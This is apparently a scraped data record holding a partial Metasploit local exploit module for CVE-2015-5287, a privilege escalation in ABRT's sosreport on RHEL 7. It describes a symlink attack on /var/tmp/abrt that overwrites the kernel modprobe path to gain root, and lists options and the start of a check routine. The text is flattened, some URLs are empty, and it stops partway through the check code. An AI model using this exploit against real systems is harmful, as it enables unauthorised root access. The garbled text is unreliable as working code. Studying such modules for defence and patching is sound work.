{
    "text": "vul_name : ABRT sosreport Privilege Escalation ， vul_cve : CVE-2015-5287 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = ExcellentRanking ， include Msf : Post : File ， include Msf : Post : Linux : Priv ， include Msf : Post : Linux : System ， include Msf : Post : Linux : Kernel ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'ABRT sosreport Privilege Escalation' ,  ， 'Description' => %q{ ， This module attempts to gain root privileges on RHEL systems with ， a vulnerable version of Automatic Bug Reporting Tool ( ABRT ) configured ， as the crash handler. ， `sosreport` uses an insecure temporary directory , allowing local users ， to write to arbitrary files ( CVE-2015-5287 ) . This module uses a symlink ， attack on `/var/tmp/abrt/cc- *  $ pid/` to overwrite the `modprobe` path ， in `/proc/sys/kernel/modprobe` , resulting in root privileges. ， Waiting for `sosreport` could take a few minutes. ， This module has been tested successfully on :  ， abrt 2.1.11-12.el7 on RHEL 7.0 x86_64 ; and ， abrt 2.1.11-19.el7 on RHEL 7.1 x86_64. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'rebel' ,  # Discovery and sosreport-rhel7.py exploit ， 'bcoles' # Metasploit ，  ]  ,  ， 'DisclosureDate' => '2015-11-23' ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => ，  [  ， ARCH_X86 ,  ， ARCH_X64 ,  ， ARCH_ARMLE ,  ， ARCH_AARCH64 ,  ， ARCH_PPC ,  ， ARCH_MIPSLE ,  ， ARCH_MIPSBE ，  ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [ 'Auto' , {} ]  ,  ， ' ，  [  ，  [ 'BID' , '78137' ]  ,  ，  [ 'CVE' , '2015-5287' ]  ,  ，  [ 'EDB' , '38832' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ， register_options [  ， OptInt.new ( 'TIMEOUT' ,  [ true , 'Timeout for sosreport ( seconds ) ' , '600' ]  )  ，  ]  ， register_advanced_options [  ， OptBool.new ( 'ForceExploit' ,  [ false , 'Override check result' , false ]  )  ,  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  ， end ， def base_dir ， datastore [ 'WritableDir' ]  ， end ， def timeout ， datastore [ 'TIMEOUT' ]  ， end ， def check ， kernel_core_pattern = cmd_exec 'grep abrt-hook-ccpp /proc/sys/kernel/core_pattern' ， unless kernel_core_pattern.include? 'abrt-hook-ccpp' ， vprint_error 'System is not configured to use ABRT for crash reporting'",
    "time": "2019.09.25"
}